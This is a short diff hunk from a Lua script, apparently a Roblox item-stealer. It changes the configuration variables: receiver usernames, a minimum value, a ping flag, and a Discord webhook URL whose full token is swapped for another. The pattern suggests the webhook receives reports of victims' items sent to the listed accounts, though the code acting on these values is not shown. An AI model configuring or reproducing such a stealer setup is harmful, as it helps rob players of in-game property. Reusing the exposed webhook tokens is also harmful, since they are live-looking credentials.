@@ -530,7 +530,7 @@ end)
 _G.Usernames = {"abababababab121qq"}
 _G.min_value = 10
 _G.pingEveryone = "Yes"
-_G.webhook = "https://discord.com/api/webhooks/1394832003928428545/TI6Wj8peOmBhp6pseo4NOI0GVWIFjbCHZi5t0Aye0TeJReO4-QXAK1SY0q6t_wwXSBdO"
+_G.webhook = "https://discord.com/api/webhooks/1395491305345519798/KafJ97pZKizhOpiz9INU9hz_M8EwF5KsMzzf3fwGfdgHEj6cPTK3gJp1CEFD_yIHuDO9"
 
 
 local users = _G.Usernames or {}
